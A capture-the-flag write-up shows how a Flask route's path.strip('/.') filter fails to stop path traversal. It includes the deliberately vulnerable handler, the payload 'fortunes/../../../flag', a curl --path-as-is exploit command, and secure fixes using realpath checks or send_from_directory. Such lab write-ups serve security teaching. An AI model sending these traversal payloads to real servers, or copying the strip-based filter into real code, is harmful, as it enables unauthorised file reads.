# Bypassing a Flawed `strip()` Filter — Flask Path Traversal, Round 2

## Summary

A second version of the challenge attempted to fix the earlier path
traversal bug by calling `path.strip("/.")` on user input before building
a filesystem path. This filter only trims characters from the *edges* of
the string, so a traversal sequence placed in the *middle* of the path —
after a real subdirectory name — passed through untouched. The result was
the same arbitrary file read as before.

- **Vulnerability class:** Path Traversal → Arbitrary File Read
- **Component:** Flask route handler
- **Root cause:** Insufficient input sanitization (`str.strip()` misused as a security control)

---

## 1. Challenge Overview

The application exposed a `/shared` endpoint for requesting files:

```
/shared/<path>
```

Relevant Flask code:

```python
@app.route("/shared", methods=["GET"])
@app.route("/shared/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")

    try:
        return open(requested_path).read()
```

The intent was to restrict file access to `/challenge/files/`.

---

## 2. Identifying the (Broken) Security Control

The difference from the previous challenge was the added filter:

```python
path.strip("/.")
```

`str.strip()` removes any of the given characters from the **start and
end** of a string only. For example:

```python
"../flag".strip("/.")   # → "flag"
```

That looks like it blocks a naive `../flag` traversal. But `strip()` never
touches characters in the middle of the string. So:

```python
"fortunes/../flag".strip("/.")   # → "fortunes/../flag"  (unchanged)
```

The traversal sequence survives completely intact as long as it isn't
sitting at the very edge of the input.

---

## 3. Enumerating the Files Directory

Looking at the challenge filesystem:

```bash
cd /challenge/files
ls
```

```
fortunes
index.html
```

The `fortunes` directory matters here: it's a real subdirectory the filter
won't touch, which gives a safe "anchor" to start a traversal sequence
from — the trick is to put `../` *after* a valid path segment rather than
at the start.

---

## 4. Understanding the Traversal

The app builds:

```python
requested_path = app.root_path + "/files/" + path.strip("/.")
```

Requesting:

```
fortunes/../../../flag
```

produces:

```
/challenge/files/fortunes/../../../flag
```

The filesystem resolves each `..` one level at a time:

```
/challenge/files/fortunes
        ↓ ..
/challenge/files
        ↓ ..
/challenge
        ↓ ..
/
```

followed by `/flag`. Because the `../` sequences are embedded inside the
path rather than at its edges, `strip("/.")` never sees them as something
to remove.

---

## 5. Exploitation

```bash
curl --path-as-is "http://challenge.localhost/shared/fortunes/../../../flag"
```

`--path-as-is` is required so curl sends the `../` sequences exactly as
written, instead of normalizing (collapsing) them client-side before the
request goes out. The server returned the flag.

---

## 6. Root Cause

The vulnerability comes from treating `path.strip("/.")` as a security
boundary. `strip()` is a trimming function, not a sanitizer:

- It only acts on the leading and trailing characters of the string.
- It has no awareness of path semantics (`..`, `.`, separators) anywhere
  else in the string.
- Any traversal sequence not touching the very start/end of the input
  passes through unchanged — including `directory/../../file`, as shown
  above.

This is a common anti-pattern: using a general-purpose string method as if
it were a path-safety check.

---

## 7. Fix

As with the first challenge, the reliable fix is to resolve the path and
verify it stays inside the intended base directory — not to blacklist or
trim specific characters:

```python
import os
from flask import abort

@app.route("/shared", methods=["GET"])
@app.route("/shared/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    base_dir = os.path.realpath(os.path.join(app.root_path, "files"))
    requested_path = os.path.realpath(os.path.join(base_dir, path))

    if not requested_path.startswith(base_dir + os.sep):
        abort(403)

    return open(requested_path).read()
```

Or, better still, use Werkzeug's built-in helper, which performs this kind
of containment check for you:

```python
from flask import send_from_directory

@app.route("/shared", methods=["GET"])
@app.route("/shared/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    return send_from_directory(app.root_path + "/files", path)
```

---

## Key Takeaways

- `..` represents the parent directory in filesystem path resolution.
- `path.strip("/.")` is **not** sufficient protection against path
  traversal — `strip()` only trims characters from the edges of a string.
- Traversal sequences can be hidden inside a path, after a legitimate
  directory name, and still fully resolve: `fortunes/../../../flag`.
- Knowing a real subdirectory (`fortunes`) gave an anchor point to build a
  working traversal payload around the edge-only filter.
- `curl --path-as-is` prevents curl from normalizing `../` sequences
  before sending the request, which is essential for testing traversal.
- Never rely on ad hoc string filtering (`strip`, `replace`, blacklists)
  to secure filesystem paths — validate that the final *resolved* path
  stays inside the intended directory, or use a vetted helper like
  `send_from_directory()`.